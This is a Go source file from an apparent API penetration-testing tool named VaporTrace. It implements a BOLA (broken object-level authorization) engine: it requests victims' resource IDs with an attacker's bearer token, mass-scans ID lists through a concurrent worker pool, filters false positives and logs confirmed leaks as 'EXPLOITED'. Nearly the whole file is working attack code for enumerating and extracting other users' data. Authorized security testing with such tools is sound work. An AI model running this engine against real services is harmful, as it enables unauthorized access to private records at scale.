package logic

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"path"
	"strings"
	"sync" // PATCH: Added sync for WaitGroup

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/pterm/pterm"
)

// BOLAContext defines the parameters for an ID-swap attack
type BOLAContext struct {
	BaseURL       string
	VictimID      string
	AttackerID    string 
	AttackerToken string
}

// MassProbe handles high-speed concurrent BOLA scanning
func (b *BOLAContext) MassProbe(idList []string, threads int) {
	pterm.DefaultHeader.WithFullWidth(false).Println("BOLA Concurrency Engine [PHASE 9.3]")
	
	idChan := make(chan string, len(idList))
	var wg sync.WaitGroup

	// Start Progress Bar
	pb, _ := pterm.DefaultProgressbar.WithTotal(len(idList)).WithTitle("Scanning IDs").Start()

	// 1. Spawn Workers
	for w := 1; w <= threads; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for id := range idChan {
				// Create a temporary context for this specific ID
				instance := *b
				instance.VictimID = id
				instance.ProbeSilent() 
				pb.Increment()
			}
		}()
	}

	// 2. Feed the IDs into the channel
	for _, id := range idList {
		idChan <- id
	}
	close(idChan)

	// 3. Wait for completion
	wg.Wait()
	pb.Stop()
	pterm.Success.Println("Mass Scan Complete. Results persisted to database.")
}

// getResource fetches a resource and returns status and body for comparison
func (b *BOLAContext) getResource(resourceID string, token string) (int, string, error) {
	u, _ := url.Parse(b.BaseURL)
	u.Path = path.Join(u.Path, resourceID)
	target := u.String()

	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.2 Surgical)")

	resp, err := GlobalClient.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body), nil
}

func (b *BOLAContext) Probe() {
	pterm.DefaultHeader.WithFullWidth(false).Println("Surgical BOLA Engine [PHASE 9.2]")

	activeToken := b.AttackerToken
	if activeToken == "" {
		activeToken = CurrentSession.AttackerToken
	}

	if activeToken == "" {
		pterm.Error.Println("No Attacker Token configured.")
		return
	}

	var baselineBody string
	if b.AttackerID != "" {
		spinner, _ := pterm.DefaultSpinner.Start("Establishing Baseline...")
		_, body, err := b.getResource(b.AttackerID, activeToken)
		if err == nil {
			baselineBody = body
			spinner.Success("Baseline established.")
		} else {
			spinner.Warning("Baseline failed. Status-only mode.")
		}
	}

	spinner, _ := pterm.DefaultSpinner.Start(fmt.Sprintf("Probing Victim ID: %s", b.VictimID))
	code, probeBody, err := b.getResource(b.VictimID, activeToken)

	if err != nil {
		spinner.Fail(fmt.Sprintf("Connection failed: %v", err))
		return
	}

	isVulnerable := false
	analysisMsg := ""

	if code == http.StatusOK {
		lowerBody := strings.ToLower(probeBody)
		isGenericError := strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") || strings.Contains(lowerBody, "denied")

		if baselineBody != "" && probeBody == baselineBody {
			spinner.Warning("Potential False Positive: Reflected self-data.")
			analysisMsg = "Reflected self-data"
		} else if isGenericError {
			spinner.Warning("False Positive Filtered: Cloaked Error.")
			analysisMsg = "Cloaked Error Message"
		} else {
			isVulnerable = true
			spinner.Success("VERIFIED BOLA VULNERABILITY")
		}
	}

	if isVulnerable {
		pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
		pterm.Warning.Println("Unauthorized data extraction confirmed.")

		pterm.DefaultTable.WithData(pterm.TableData{
			{"METRIC", "VALUE"},
			{"RESOURCE ID", b.VictimID},
			{"LEAK SIZE", fmt.Sprintf("%d bytes", len(probeBody))},
		}).WithBoxed().Render()

		db.LogQueue <- db.Finding{
			Phase:   "PHASE 9.2: SURGICAL BOLA",
			Target:  b.BaseURL + "/" + b.VictimID,
			Details: fmt.Sprintf("Confirmed BOLA on %s", b.VictimID),
			Status:  "EXPLOITED",
		}
	} else if code == 403 || code == 401 {
		spinner.Success("Target Secure (403/401)")
	} else {
		spinner.Stop() 
		pterm.Info.Printfln("Result: %s", analysisMsg)
	}
}

// ProbeSilent - MOVED OUTSIDE Probe() to fix syntax error
func (b *BOLAContext) ProbeSilent() {
	activeToken := b.AttackerToken
	if activeToken == "" { activeToken = CurrentSession.AttackerToken }

	code, body, err := b.getResource(b.VictimID, activeToken)
	if err != nil { return }

	if code == 200 {
		lowerBody := strings.ToLower(body)
		if strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") {
			return 
		}

		pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
		pterm.Warning.Printfln(" BOLA Confirmed: %s", b.VictimID)

		db.LogQueue <- db.Finding{
			Phase:   "PHASE 9.3: CONCURRENT BOLA",
			Target:  b.BaseURL + "/" + b.VictimID,
			Details: "Confirmed via Multi-threaded Worker Pool",
			Status:  "EXPLOITED",
		}
	}
}